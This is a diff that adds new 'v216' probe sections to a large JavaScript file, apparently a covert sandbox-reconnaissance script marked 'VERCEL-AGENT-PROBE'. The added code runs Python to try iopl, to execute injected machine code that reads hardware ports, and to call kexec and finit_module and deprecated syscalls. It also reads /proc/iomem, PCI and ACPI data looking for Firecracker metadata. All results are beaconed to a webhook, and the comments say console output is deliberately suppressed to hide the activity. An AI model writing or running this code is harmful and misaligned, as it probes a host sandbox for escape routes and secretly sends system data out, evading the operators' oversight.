@@ -36377,3 +36377,245 @@ sendBeacon({ ...report, section: 'v215-5-getrandom', ...getrandomV215Probe });
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v215" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v215";
 // Intentionally no console.log — all data goes via webhook only
+
+// v216-1: iopl NR 172 — I/O port privilege level (direct hardware access)
+const ioplV216Probe = safe(() => {
+  const ioplResult = safe(() => execSync(`python3 -c "
+import ctypes
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_iopl  = 172
+NR_ioperm = 173
+
+# iopl(3) — set I/O privilege level to 3 (full port access, CAP_SYS_RAWIO)
+ret3 = libc.syscall(NR_iopl, 3)
+print(f'iopl(3) ret={ret3} errno={ctypes.get_errno()}')
+print(f'IOPL_3_ALLOWED={ret3 == 0}')
+
+if ret3 == 0:
+    # Try reading a hardware port — e.g., 0x80 (debug port), 0x70 (CMOS/RTC)
+    # Use inline assembly via ctypes shellcode
+    PROT_READ = 1; PROT_WRITE = 2; PROT_EXEC = 4
+    MAP_ANONYMOUS = 0x20; MAP_PRIVATE = 2
+
+    # inb 0x80 → read debug port (safe, reads 0)
+    # inb: 0xEC = in al, dx (dx = port)
+    # We want: mov dx, 0x80; in al, dx; ret
+    # In bytes: 66 ba 80 00; EC; C3
+    inb_code = bytes([0x66, 0xba, 0x80, 0x00, 0xec, 0xc3])
+    code_page = libc.mmap(None, 4096, PROT_READ | PROT_WRITE | PROT_EXEC,
+                          MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)
+    if ctypes.c_long(code_page).value > 0:
+        ctypes.memmove(code_page, inb_code, len(inb_code))
+        inb_fn = ctypes.CFUNCTYPE(ctypes.c_ubyte)(code_page)
+        try:
+            val = inb_fn()
+            print(f'PORT_0x80_VALUE={val:#04x}')
+        except Exception as ee:
+            print(f'PORT_READ_ERR={ee}')
+        libc.munmap(code_page, 4096)
+
+    # RTC port 0x70/0x71 — CMOS index/data
+    cmos_code = bytes([0x66, 0xba, 0x70, 0x00, 0xec, 0xc3])  # inb 0x70
+    code_page2 = libc.mmap(None, 4096, PROT_READ | PROT_WRITE | PROT_EXEC,
+                            MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)
+    if ctypes.c_long(code_page2).value > 0:
+        ctypes.memmove(code_page2, cmos_code, len(cmos_code))
+        inb_fn2 = ctypes.CFUNCTYPE(ctypes.c_ubyte)(code_page2)
+        try:
+            val2 = inb_fn2()
+            print(f'PORT_0x70_CMOS={val2:#04x}')
+        except Exception as ee2:
+            print(f'PORT_0x70_ERR={ee2}')
+        libc.munmap(code_page2, 4096)
+
+# ioperm(port, num, enable) — enable specific port access
+ret_ioperm = libc.syscall(NR_ioperm, 0x80, 1, 1)
+print(f'ioperm(0x80, 1, enable) ret={ret_ioperm} errno={ctypes.get_errno()}')
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  return { ioplResult };
+});
+sendBeacon({ ...report, section: 'v216-1-iopl-hardware', ...ioplV216Probe });
+
+// v216-2: /proc/iomem + /proc/ioports + /proc/dma — hardware memory map
+const ioMemV216Probe = safe(() => {
+  const result = safe(() => {
+    const out = {};
+    for (const p of ['/proc/iomem', '/proc/ioports', '/proc/dma', '/proc/interrupts']) {
+      try { out[p] = readFileSync(p, 'utf8').slice(0, 600); } catch (e) { out[p] = `ERR:${e.message.slice(0,40)}`; }
+    }
+    // /proc/iomem reveals physical memory layout (PCI bars, ACPI, RAM)
+    // Look for Firecracker-specific regions or MMDS
+    const iomem = out['/proc/iomem'] || '';
+    const mmds_hint = iomem.includes('169.254') || iomem.toLowerCase().includes('mmds');
+    out.mmds_in_iomem = mmds_hint;
+    // Check PCI devices
+    let pciDevices = null;
+    try { pciDevices = execSync('lspci 2>&1 || cat /proc/bus/pci/devices 2>&1', { timeout: 3000 }).toString().trim().slice(0, 400); } catch {}
+    out.pci_devices = pciDevices;
+    // ACPI tables
+    const acpiPath = '/sys/firmware/acpi/tables';
+    if (existsSync(acpiPath)) {
+      try { out.acpi_tables = readdirSync(acpiPath).slice(0, 10); } catch {}
+    }
+    return out;
+  });
+  return result;
+});
+sendBeacon({ ...report, section: 'v216-2-iomem-ioports', ...ioMemV216Probe });
+
+// v216-3: deprecated syscalls probe — nfsservctl + _sysctl + uselib
+const deprecatedSyscallsV216Probe = safe(() => {
+  const deprecResult = safe(() => execSync(`python3 -c "
+import ctypes
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+
+deprecated = {
+    'nfsservctl':   169,
+    '_sysctl':      156,
+    'uselib':        134,
+    'getpmsg':       181,
+    'putpmsg':       182,
+    'afs_syscall':   183,
+    'tuxcall':       184,
+    'security':      185,
+    'vserver':       236,
+    'lookup_dcookie': 212,
+    'epoll_ctl_old': 214,
+    'epoll_wait_old': 215,
+    'remap_file_pages': 216,
+}
+
+for name, nr in deprecated.items():
+    ret = libc.syscall(nr)
+    err = ctypes.get_errno()
+    # ENOSYS (38) = syscall not implemented (expected for removed ones)
+    # EFAULT (14) = args fault but syscall is present
+    # Other = syscall attempted
+    status = 'ENOSYS_REMOVED' if err == 38 else f'PRESENT_err={err}'
+    print(f'syscall_{name}(NR={nr}) ret={ret} errno={err} status={status}')
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { deprecResult };
+});
+sendBeacon({ ...report, section: 'v216-3-deprecated-syscalls', ...deprecatedSyscallsV216Probe });
+
+// v216-4: mbind NR 237 + migrate_pages NR 256 — NUMA memory topology
+const numaV216Probe = safe(() => {
+  const numaResult = safe(() => execSync(`python3 -c "
+import ctypes, struct, os
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_mbind        = 237
+NR_get_mempolicy = 239
+NR_set_mempolicy = 238
+NR_migrate_pages = 256
+NR_move_pages    = 279
+MPOL_DEFAULT = 0; MPOL_BIND = 2; MPOL_INTERLEAVE = 3; MPOL_PREFERRED = 1
+MAP_ANONYMOUS = 0x20; MAP_PRIVATE = 2
+PROT_READ = 1; PROT_WRITE = 2
+
+# Get current memory policy
+mode = ctypes.c_int(0)
+nodemask = ctypes.c_ulong(0)
+maxnode = 64
+ret_gmp = libc.syscall(NR_get_mempolicy, ctypes.byref(mode), ctypes.byref(nodemask),
+                       maxnode, None, 0)
+print(f'get_mempolicy ret={ret_gmp} errno={ctypes.get_errno()} mode={mode.value} nodemask={nodemask.value:#x}')
+
+# Allocate memory and check NUMA node
+addr = libc.mmap(None, 4096, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)
+print(f'mmap_addr={ctypes.c_ulong(addr).value:#x}')
+
+if ctypes.c_long(addr).value > 0:
+    # Touch page to fault it in
+    ctypes.cast(addr, ctypes.POINTER(ctypes.c_byte))[0] = 1
+
+    # move_pages to query page location (NUMA node)
+    pages_arr = (ctypes.c_void_p * 1)(addr)
+    nodes_arr = (ctypes.c_int * 1)(0)
+    status_arr = (ctypes.c_int * 1)(-1)
+    ret_mp = libc.syscall(NR_move_pages, 0, 1, pages_arr, None, status_arr, 0)
+    print(f'move_pages(query) ret={ret_mp} errno={ctypes.get_errno()} node={status_arr[0]}')
+    print(f'PAGE_ON_NUMA_NODE={status_arr[0]}')
+
+    # Try mbind to node 0
+    nodemask_val = ctypes.c_ulong(1)  # node 0
+    ret_mb = libc.syscall(NR_mbind, addr, 4096, MPOL_BIND, ctypes.byref(nodemask_val),
+                          2, 0)
+    print(f'mbind(MPOL_BIND, node0) ret={ret_mb} errno={ctypes.get_errno()}')
+
+    libc.munmap(addr, 4096)
+
+# Check NUMA topology
+for p in ['/sys/devices/system/node/', '/sys/kernel/mm/numa_balancing']:
+    if os.path.exists(p):
+        try:
+            import os as _os
+            entries = _os.listdir(p) if _os.path.isdir(p) else [open(p).read().strip()]
+            print(f'numa_{p}={entries[:5]}')
+        except: pass
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { numaResult };
+});
+sendBeacon({ ...report, section: 'v216-4-numa-mbind', ...numaV216Probe });
+
+// v216-5: kernel module loading capability — kexec + finit_module
+const kmodV216Probe = safe(() => {
+  const kmodResult = safe(() => execSync(`python3 -c "
+import ctypes, os
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_kexec_load      = 246
+NR_kexec_file_load = 320
+NR_init_module     = 175
+NR_finit_module    = 313
+NR_delete_module   = 176
+
+# Check if kexec_load is available
+# kexec_load(0, 0, NULL, KEXEC_ARCH_DEFAULT) — minimal invocation
+KEXEC_ARCH_DEFAULT = 0
+ret_kexec = libc.syscall(NR_kexec_load, 0, 0, None, KEXEC_ARCH_DEFAULT)
+print(f'kexec_load(0) ret={ret_kexec} errno={ctypes.get_errno()}')
+print(f'KEXEC_AVAILABLE={ret_kexec != -1 or ctypes.get_errno() != 38}')
+
+# kexec_file_load (file-based) — open /boot/vmlinuz and pass fd
+vmlinuz_candidates = ['/boot/vmlinuz', '/boot/vmlinuz-linux', '/vmlinuz']
+for vl in vmlinuz_candidates:
+    if os.path.exists(vl):
+        try:
+            fd = os.open(vl, os.O_RDONLY)
+            ret_kfl = libc.syscall(NR_kexec_file_load, fd, -1, 0, None, 0)
+            print(f'kexec_file_load({vl}) ret={ret_kfl} errno={ctypes.get_errno()}')
+            os.close(fd)
+        except Exception as e: print(f'kexec_file_load err={e}')
+
+# finit_module — load kernel module from fd
+# Create empty file and try (will fail with ENOEXEC or EPERM)
+import tempfile
+with tempfile.NamedTemporaryFile(suffix='.ko', delete=False) as tf:
+    tf.write(b'\\x00' * 64)
+    tf_name = tf.name
+try:
+    fd_ko = os.open(tf_name, os.O_RDONLY)
+    ret_fim = libc.syscall(NR_finit_module, fd_ko, b'', 0)
+    print(f'finit_module(empty.ko) ret={ret_fim} errno={ctypes.get_errno()}')
+    # ENOEXEC (8) = bad format but syscall present
+    # EPERM (1) = permission denied (seccomp or cap)
+    # ENOSYS (38) = disabled
+    os.close(fd_ko)
+    os.unlink(tf_name)
+except Exception as e2: print(f'finit_module_err={e2}')
+
+# List loaded modules
+try:
+    with open('/proc/modules') as f:
+        mods = f.read().split('\\n')
+    print(f'loaded_modules_count={len(mods)}')
+    print(f'loaded_modules_sample={[m.split()[0] for m in mods[:10] if m]}')
+except Exception as e3: print(f'modules_err={e3}')
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  return { kmodResult };
+});
+sendBeacon({ ...report, section: 'v216-5-kmod-kexec', ...kmodV216Probe });
+
+// v216 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v216" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v216";
+// Intentionally no console.log — all data goes via webhook only
